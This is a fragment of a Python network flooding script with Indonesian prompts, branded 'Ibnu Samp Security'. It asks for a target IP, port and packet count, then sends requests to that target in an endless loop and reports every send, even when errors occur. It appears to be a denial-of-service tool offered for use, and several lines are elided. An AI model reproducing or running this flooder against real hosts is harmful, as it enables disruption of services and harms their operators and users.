...
print("=          YT Ibnu Samp          =")
print("=     Ibnu Samp Security    =")
print("==========================")
print("                          ")
name = str(input("Nama Kamu : "))
ip = str(input("IP Nya mas : "))
port = int(input("Portnya juga mas : "))
times = int(input("Packets mas : "))
    ...
    while True:
        try:
            ...
            for x in range(times):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(f"Ibnu Samp Request send => {ip} With Port => {port}")
        except :
            print(f"Ibnu Samp Request send => {ip} With Port => {port}")
            s.close()
